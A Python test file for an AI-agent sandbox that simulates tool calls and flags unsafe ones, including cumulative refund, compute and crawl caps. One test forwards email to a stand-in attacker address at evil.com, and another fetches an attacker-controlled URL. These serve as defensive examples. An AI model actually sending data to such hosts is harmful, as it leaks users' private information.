from secureagentnet.privilege.policy_engine import ToolCallRequest
from secureagentnet.simulate.digital_twin import (
    CalendarTwin,
    CodeExecTwin,
    DigitalTwinSandbox,
    FilesystemTwin,
    InboxTwin,
    SupportTwin,
    WebTwin,
)


def test_forward_to_known_contact_is_safe():
    """Matches the doc's own worked example, positive case: recipient
    matches a known contact.
    """
    inbox = InboxTwin(known_contacts={"manager@secureagentnet-corp.com"})
    sandbox = DigitalTwinSandbox(inbox=inbox)
    result = sandbox.run(ToolCallRequest(tool_name="forward_email", resource="manager@secureagentnet-corp.com"))
    assert result.safe
    assert result.twin_outcome["recipient_known"]


def test_forward_to_unknown_recipient_is_flagged_unsafe():
    """The doc's own worked example: forwarding to a domain that matches
    no known contact and isn't who the instruction named.
    """
    inbox = InboxTwin(known_contacts={"manager@secureagentnet-corp.com"})
    sandbox = DigitalTwinSandbox(inbox=inbox)
    result = sandbox.run(ToolCallRequest(tool_name="forward_email", resource="attacker@evil.com"))
    assert not result.safe
    assert any("known contact" in note for note in result.safety_notes)


def test_state_persists_across_calls_within_a_session():
    """The 'full simulated environment' requirement: a write followed by a
    read reflects the earlier write — state, not stateless stubs.
    """
    fs = FilesystemTwin()
    sandbox = DigitalTwinSandbox(filesystem=fs)
    sandbox.run(ToolCallRequest(tool_name="write_file", resource="/workspace/notes.md", params={"content": "hello"}))
    result = sandbox.run(ToolCallRequest(tool_name="read_file", resource="/workspace/notes.md"))
    assert result.twin_outcome["content"] == "hello"
    assert result.twin_outcome["exists"]


def test_deleting_existing_file_is_flagged_unsafe():
    fs = FilesystemTwin(files={"/workspace/report.docx": "important"})
    sandbox = DigitalTwinSandbox(filesystem=fs)
    result = sandbox.run(ToolCallRequest(tool_name="delete_file", resource="/workspace/report.docx"))
    assert not result.safe
    assert "/workspace/report.docx" not in fs.files  # twin state actually mutated


def test_deleting_nonexistent_file_is_safe_noop():
    fs = FilesystemTwin()
    sandbox = DigitalTwinSandbox(filesystem=fs)
    result = sandbox.run(ToolCallRequest(tool_name="delete_file", resource="/workspace/ghost.txt"))
    assert result.safe


def test_calendar_mass_invite_flagged_unsafe():
    sandbox = DigitalTwinSandbox(calendar=CalendarTwin(), max_attendees=10)
    result = sandbox.run(ToolCallRequest(tool_name="create_event", params={"attendee_count": 500}))
    assert not result.safe


def test_calendar_event_ids_increment_across_calls():
    calendar = CalendarTwin()
    sandbox = DigitalTwinSandbox(calendar=calendar)
    r1 = sandbox.run(ToolCallRequest(tool_name="create_event", params={"attendee_count": 2}))
    r2 = sandbox.run(ToolCallRequest(tool_name="create_event", params={"attendee_count": 2}))
    assert r1.twin_outcome["event_id"] != r2.twin_outcome["event_id"]
    assert len(calendar.events) == 2


def test_unrecognized_tool_defaults_to_safe_with_a_note():
    sandbox = DigitalTwinSandbox()
    result = sandbox.run(ToolCallRequest(tool_name="totally_made_up_tool", resource="/x"))
    assert result.safe
    assert "no twin backend" in result.safety_notes[0]


# --- code_exec_agent twin ----------------------------------------------------

def test_single_run_code_call_within_cumulative_cap_is_safe():
    sandbox = DigitalTwinSandbox(code_exec=CodeExecTwin(max_cumulative_cpu_seconds=60))
    result = sandbox.run(ToolCallRequest(tool_name="run_code", resource="/sandbox/x", params={"timeout_seconds": 10}))
    assert result.safe
    assert result.twin_outcome["cumulative_cpu_seconds"] == 10


def test_run_code_now_has_a_real_twin_backend_not_the_fallback():
    """This exact call used to hit the 'no twin backend' fallback —
    confirms the coverage gap flagged earlier is closed.
    """
    sandbox = DigitalTwinSandbox()
    result = sandbox.run(ToolCallRequest(tool_name="run_code", resource="/sandbox/x", params={"timeout_seconds": 5}))
    assert "no twin backend" not in " ".join(result.safety_notes)


def test_cumulative_run_code_calls_exceed_cap_even_when_individually_small():
    """The point of stateful simulation: no single call looks unsafe, but
    the running total across a session does.
    """
    twin = CodeExecTwin(max_cumulative_cpu_seconds=15)
    sandbox = DigitalTwinSandbox(code_exec=twin)
    r1 = sandbox.run(ToolCallRequest(tool_name="run_code", resource="/sandbox/a", params={"timeout_seconds": 10}))
    r2 = sandbox.run(ToolCallRequest(tool_name="run_code", resource="/sandbox/b", params={"timeout_seconds": 10}))
    assert r1.safe  # 10s alone, under the 15s cap
    assert not r2.safe  # 10 + 10 = 20s cumulative, over the 15s cap


def test_list_sandbox_files_reflects_twin_state():
    twin = CodeExecTwin(sandbox_files={"/sandbox/a.py": "print(1)"})
    sandbox = DigitalTwinSandbox(code_exec=twin)
    result = sandbox.run(ToolCallRequest(tool_name="list_sandbox_files", resource="/sandbox/"))
    assert result.twin_outcome["files"] == ["/sandbox/a.py"]


# --- support_agent twin -------------------------------------------------------

def test_single_refund_within_cumulative_cap_is_safe():
    sandbox = DigitalTwinSandbox(support=SupportTwin(max_cumulative_refund_usd=100))
    result = sandbox.run(ToolCallRequest(tool_name="issue_refund", resource="order_1", params={"amount_usd": 30}))
    assert result.safe


def test_issue_refund_now_has_a_real_twin_backend_not_the_fallback():
    sandbox = DigitalTwinSandbox()
    result = sandbox.run(ToolCallRequest(tool_name="issue_refund", resource="order_1", params={"amount_usd": 10}))
    assert "no twin backend" not in " ".join(result.safety_notes)


def test_cumulative_refunds_on_same_order_exceed_cap_even_when_individually_permitted():
    """Each individual refund could pass the privilege layer's per-call
    $50 cap while the running total on one order doesn't — this is a
    check the stateless ABAC condition genuinely cannot express.
    """
    twin = SupportTwin(max_cumulative_refund_usd=100)
    sandbox = DigitalTwinSandbox(support=twin)
    r1 = sandbox.run(ToolCallRequest(tool_name="issue_refund", resource="order_9", params={"amount_usd": 45}))
    r2 = sandbox.run(ToolCallRequest(tool_name="issue_refund", resource="order_9", params={"amount_usd": 45}))
    r3 = sandbox.run(ToolCallRequest(tool_name="issue_refund", resource="order_9", params={"amount_usd": 45}))
    assert r1.safe  # 45 total
    assert r2.safe  # 90 total, still under 100
    assert not r3.safe  # 135 total, over the 100 cap


def test_refund_caps_are_tracked_independently_per_order():
    twin = SupportTwin(max_cumulative_refund_usd=50)
    sandbox = DigitalTwinSandbox(support=twin)
    sandbox.run(ToolCallRequest(tool_name="issue_refund", resource="order_a", params={"amount_usd": 45}))
    result_b = sandbox.run(ToolCallRequest(tool_name="issue_refund", resource="order_b", params={"amount_usd": 45}))
    assert result_b.safe  # order_b's own total (45) is unaffected by order_a's


# --- research_agent twin -------------------------------------------------------

def test_fetch_url_now_has_a_real_twin_backend_not_the_fallback():
    """research_agent's tools had no twin coverage at all until this fix —
    confirms that gap is closed.
    """
    sandbox = DigitalTwinSandbox()
    result = sandbox.run(ToolCallRequest(tool_name="fetch_url", resource="https://example.com/page"))
    assert "no twin backend" not in " ".join(result.safety_notes)


def test_fetch_url_with_no_allowlist_configured_is_safe_by_default():
    sandbox = DigitalTwinSandbox()
    result = sandbox.run(ToolCallRequest(tool_name="fetch_url", resource="https://anything.example.com/x"))
    assert result.safe


def test_fetch_url_outside_trusted_domains_is_flagged_unsafe():
    twin = WebTwin(trusted_domains={"wikipedia.org", "en.wikipedia.org"})
    sandbox = DigitalTwinSandbox(web=twin)
    result = sandbox.run(ToolCallRequest(tool_name="fetch_url", resource="https://attacker-controlled.example.com/x"))
    assert not result.safe


def test_fetch_url_within_trusted_domains_is_safe():
    twin = WebTwin(trusted_domains={"wikipedia.org", "en.wikipedia.org"})
    sandbox = DigitalTwinSandbox(web=twin)
    result = sandbox.run(ToolCallRequest(tool_name="fetch_url", resource="https://en.wikipedia.org/wiki/X"))
    assert result.safe


def test_cumulative_distinct_domain_fetches_exceed_cap_even_when_each_domain_is_trusted():
    """The stateful check: no single fetch looks unusual, but crawling
    many distinct domains in one session does — a per-call resource
    pattern like ["https://*"] can never catch this.
    """
    twin = WebTwin(max_distinct_domains=3)
    sandbox = DigitalTwinSandbox(web=twin)
    domains = ["a.com", "b.com", "c.com", "d.com"]
    results = [
        sandbox.run(ToolCallRequest(tool_name="fetch_url", resource=f"https://{d}/x")) for d in domains
    ]
    assert all(r.safe for r in results[:3])  # first 3 distinct domains, within cap
    assert not results[3].safe  # 4th distinct domain exceeds the cap of 3


def test_refetching_the_same_domain_does_not_count_twice_toward_the_cap():
    twin = WebTwin(max_distinct_domains=2)
    sandbox = DigitalTwinSandbox(web=twin)
    sandbox.run(ToolCallRequest(tool_name="fetch_url", resource="https://a.com/1"))
    sandbox.run(ToolCallRequest(tool_name="fetch_url", resource="https://a.com/2"))  # same domain, different path
    result = sandbox.run(ToolCallRequest(tool_name="fetch_url", resource="https://b.com/1"))
    assert result.safe  # only 2 distinct domains (a.com, b.com) seen, at the cap but not over


def test_save_note_persists_across_calls():
    twin = WebTwin()
    sandbox = DigitalTwinSandbox(web=twin)
    sandbox.run(ToolCallRequest(tool_name="save_note", resource="/workspace/notes/x.md", params={"content": "hi"}))
    assert twin.notes["/workspace/notes/x.md"] == "hi"


def test_web_search_has_a_twin_backend():
    sandbox = DigitalTwinSandbox()
    result = sandbox.run(ToolCallRequest(tool_name="web_search", resource="climate change"))
    assert "no twin backend" not in " ".join(result.safety_notes)
    assert result.safe
